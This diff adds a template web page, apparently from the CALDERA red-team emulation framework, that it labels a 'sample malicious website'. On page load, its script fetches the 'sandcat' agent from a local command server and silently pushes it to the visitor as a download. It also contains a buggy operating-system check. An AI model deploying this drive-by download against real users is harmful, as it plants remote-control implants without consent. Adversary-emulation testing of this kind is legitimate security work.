@@ -1,0 +1,46 @@
+<script src="/gui/js/shared.js"></script>
+<html>
+    <head>
+        <title>Sample website</title>
+        <link rel="stylesheet" href="/gui/css/shared.css">
+    </head>
+    <body style="margin-bottom: 100px">
+        <div>
+            <div class="row">
+                <div class="column" style="flex: 75%;margin-top:50px;">
+                    <p>Welcome to the sample malicious website hosted in CALDERA. Replace this page with a cloned website of your choice.</p>
+                </div>
+            </div>
+        </div>
+    </body>
+    <script src="/gui/jquery/jquery.js"></script>
+    <script>
+        let headers = {
+            "file": "sandcat.go",
+            "platform": determinePlatform()
+        };
+        fetch('http://localhost:8888/file/download', {
+            method: "POST",
+            headers: headers})
+          .then(resp => resp.blob())
+          .then(blob => {
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'sandcat';
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+          }).catch(() => console.log("Error auto-downloading 54ndc47"));
+
+        function determinePlatform() {
+            let OSName = "unknown";
+            if (window.navigator.userAgent.startsWith("Windows")!= -1) OSName="windows";
+            if (window.navigator.userAgent.indexOf("Mac") != -1) OSName="darwin";
+            if (window.navigator.userAgent.indexOf("X11") != -1) OSName="linux";
+            if (window.navigator.userAgent.indexOf("Linux") != -1) OSName="linux";
+            return OSName;
+        }
+    </script>
+</html>
